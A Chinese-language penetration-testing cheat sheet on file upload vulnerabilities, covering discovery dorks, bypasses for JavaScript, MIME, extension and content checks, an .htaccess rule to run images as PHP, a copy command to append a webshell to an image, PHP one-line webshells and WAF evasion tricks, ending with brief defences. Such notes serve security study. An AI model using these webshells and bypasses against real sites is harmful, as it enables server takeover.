## 一、漏洞原理

### 1、简介

```python
# 解释
文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，上传能被服务端解析执行的文件，并通过此文件获取执行服务端命令的能力
```

### 2、详情

```python
# Javascript检测
readBuffer
check
```

```python
# 后端检测
1、文件名
2、MIME
3、文件内容
```

```python
# 二次渲染
1、文件头
2、文件内容
3、文件名
```



## 二、漏洞特征

### 1、场景

```python
头像更改
文章编辑(附件上传)
```

### 2、发现

```python
# Google Hacking
inurl:upload_file.php
inurl:upfile.php
```

```python
# Fofa（CVE）
"Apache Tomcat 8.5.19"		# CVE
```



## 三、利用条件

### 1、存在上传点

### 2、PHP/ASP/JSP语言



## 四、绕过防护

### 1、前端

```python
# Javascript
1、禁用Javascript，如火狐浏览器的NoScript
2、删除/修改对应JS代码，如F12/Firbug
3、修改数据包，如Burpsuite
```

### 2、后端

​	2.1、MIME文件类型

- 修改数据包Content-type

```python
# 格式
text/plain				纯文本
text/html				HTML文档
text/javascript			Javascript代码
application/xhtml+xml	 XHTML文档
image/gif				GIF图片
image/jpeg				JPEG图片
image/png				PNG图片
image/mpeg				MPEG动画
application/octet-stream 二进制数据
application/pdf			PDF文档
```

​	2.2、文件名

- 黑名单

```python
# 1、寻找黑名单之外的后缀名
jsp			[jspx,jspf,jsw,jsv]
asp			[asa,cer,cdx,htr,web.config]
aspx		[ashx,asmx,asax,ascx]
php			[php1,php2,php3,php4,php5,phtml,pht,php3p]
perl		[pl,pm,cgi,lib]
Coldfusion	 [cfm,cfml,cfc,dbm]
# 2、大小写
php版本 < 5.3.39
# 3、双写
# 4、Windows命名机制
shell.php.
shell.php空格
shell.php:1.jpg
# 5、上传配置文件
apache的.access
```

- 白名单

```python
# 文件包含
```

```python
# 截断上传
条件：PHP版本 < 5.3.4
方法：%00
```

```python
# 解析漏洞
# 1、Apache
自身特性
	解释：Apache文件规则是从右到左判断解析，如果后缀名为不可识别文件，就再往左判断
.htaccess
	解释：.htaccess文件可以定义目录的配置方法
    用法：当前目录如果存在x.png，将其解析成php代码执行
    	<FilesMatch "x.png">
        SetHandler application/x-httpd-php
        AddHandler php5-script .png
        </FilesMatch>
# 2、Windows
自身特性
	解释：旧版Windows Server对于不符合操作系统命名规范的文件，会将字符自动去除
    用法：
    	file.php[空格]	->	file.php
        file.php.		  ->  file.php
        file.php:1.jpg	  ->  file.php
```

​	2.3、文件内容

- 修改文件头

```python
# 例如
JPG: FF D8 FF E0 00 10 4A 46 49 46
GIF: 47 49 46 3839 61(GIF89a)
PNG: 89 50 4E 47
```



### 3、二次渲染

​	3.1、文件头

```python
# 文本编辑器
	在内容最前面加图片文件头（如GIF89a;）
# 二进制文本编辑器
	在完整图片末尾加webshell
# windows的copy命令
	copy a.png /b + a.php /a 3.php
```

​	3.2、文件内容

```python
# 一句话木马变形
<?php $_GET['a']($_GET['b']);?>
```

```python
# 执行其他命令
# 1、文件包含
$filename=$_GET['a'];include($filename);
# 2、重命名任何文件
$reg='c'.'o'.'p'.'y'
$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
# 3、Preg_replace函数
@preg_replace("/[pageerror]/e",$_POST['error'],"saft");
```

​	3.3、绕过WAF

```python
# 垃圾数据
如服务器允许文件大小上限为1M，此时上传一个大文件，前面1M的内容为垃圾数据，
```

```python
# post/get
条件：WAF规则是只检测GET/POST请求类型的数据包，此时修改请求方法为REQUEST绕过
```

```python
# Filename
条件：早期版本的安全狗可多加一个filename绕过
```



## 五、实战思路

### 1、寻找上传点

### 2、获取文件保存地址

### 3、检测防御类型



## 六、防护措施

1、后端使用白名单校验文件类型

2、文件上传的目录设置为不可执行

3、使用随机数改写文件名和文件路径

4、单独设置文件服务器域名